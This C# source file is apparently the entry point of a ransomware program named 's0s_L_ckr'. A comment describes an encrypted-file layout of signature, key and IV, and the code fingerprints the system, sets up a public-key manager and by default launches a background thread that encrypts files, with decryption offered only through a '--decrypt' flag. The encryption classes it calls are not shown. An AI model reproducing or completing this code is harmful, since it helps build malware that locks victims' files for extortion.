using System.Diagnostics;
using System.Threading;

/*************************
 * Encrypted File        *
 * ***********************
 * Signature            *
 * KEY                  *
 * IV                   *
 * Encrypted Data       *
 * *********************/



namespace s0s_L_ckr
{
    class Program
    {
        static int Main(string[] args)
        {
            Trace.Listeners.Add(new ConsoleTraceListener());

            string ops = (args.Length > 0 && args[0] == "--decrypt" ? "D" : "E");

            //Debug Generation
#if DEBUG
            string fingerprint = null;
                        CompIdStrat.StickyFingerPrinter(ref fingerprint);

                        Trace.WriteLine("[+] System FingerPrint: " + fingerprint);
#endif

            // Criptographic Key Manager for Files
            CriptoKeyMgr.EnsrLocPubKey();

            int resultVal = -1;
            ThreadStart threadStart = null;

            //If given E parameter we Encrypt, Else D for Decrypt
            if ("E" == ops)
            {
                threadStart = new ThreadStart(ENCR_ALL_THE_THINGS);
                resultVal = 0; //Start of Encryption Thread
            }
            else if ("D" == ops)
            {
                //Start of Decrypt thread
                threadStart = new ThreadStart(DECR_ALL_THE_THINGS);
                resultVal = 1; //Start of Decryption Thread
            }
            //If thread contains data
            if (threadStart != null)
            {
                Thread thread = new Thread(threadStart);
                thread.Priority = ThreadPriority.BelowNormal;
                thread.IsBackground = true;
                thread.Start();
                thread.Join();
            }

            return resultVal;
        }

        private static void ENCR_ALL_THE_THINGS()
        {
            EncrStr encryptionStrategy = new EncrStr();
            encryptionStrategy.EncrDis();
        }

        private static void DECR_ALL_THE_THINGS()
        {
            DecStr decryptionStategy = new DecStr();
            decryptionStategy.DecrDis();
        }
    }
}
